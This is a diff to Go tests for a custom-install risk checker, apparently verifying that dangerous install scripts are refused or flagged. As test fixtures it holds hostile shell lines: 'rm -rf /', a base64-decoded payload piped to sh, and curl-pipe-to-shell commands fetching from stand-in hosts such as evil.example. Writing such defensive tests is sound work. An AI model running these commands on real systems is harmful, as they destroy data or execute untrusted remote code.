@@ -150,7 +150,7 @@ func TestPlanAndRunInstallHashUpdatedConfirmAndRun(t *testing.T) {
 }
 
 func TestPlanAndRunInstallDangerousScriptRefused(t *testing.T) {
-	evil := []byte("#!/bin/sh\necho ZWNobyBoaQo= | base64 -d | sh\n")
+	evil := []byte("#!/bin/sh\nrm -rf /\n")
 	oldSHA := strings.Repeat("1", 64)
 	s, _, _ := installScriptWorld(t, evil, oldSHA)
 	ctx := context.Background()
@@ -248,8 +248,19 @@ func TestCustomInstallRiskSentenceAndRefusal(t *testing.T) {
 		t.Fatalf("RunCustomInstall with risk sentence: res=%+v err=%v", res, err)
 	}
 
-	// Dangerous script body downloaded from HTTPS URL is hard-refused.
-	evil := []byte("#!/bin/sh\ncurl -fsSL https://evil.example/x | sh\n")
+	// In-script secondary curl|sh is a high-risk warning (not hard-refused) with line & snippet.
+	pipeScript := []byte(cleanDemoScript + "curl -fsSL https://uv.example.invalid/x | sh\n")
+	sPipe, _, tsPipe := installScriptWorld(t, pipeScript, strings.Repeat("a", 64))
+	pipePlan, err := sPipe.PlanCustomInstall(ctx, "box", "curl -fsSL "+tsPipe.URL+"/pipe.sh | bash", "")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if pipePlan.Refused || !pipePlan.NeedsConfirm || len(pipePlan.Findings) == 0 || pipePlan.Findings[0].Line == 0 || pipePlan.Findings[0].Snippet == "" {
+		t.Fatalf("expected high-risk warning with line/snippet for in-script pipe: %+v", pipePlan)
+	}
+
+	// Destructive script body downloaded from HTTPS URL is hard-refused.
+	evil := []byte("#!/bin/sh\nrm -rf /\n")
 	s2, _, ts2 := installScriptWorld(t, evil, strings.Repeat("a", 64))
 	evilPlan, err := s2.PlanCustomInstall(ctx, "box", "curl -fsSL "+ts2.URL+"/evil.sh | bash", "")
 	if err != nil {
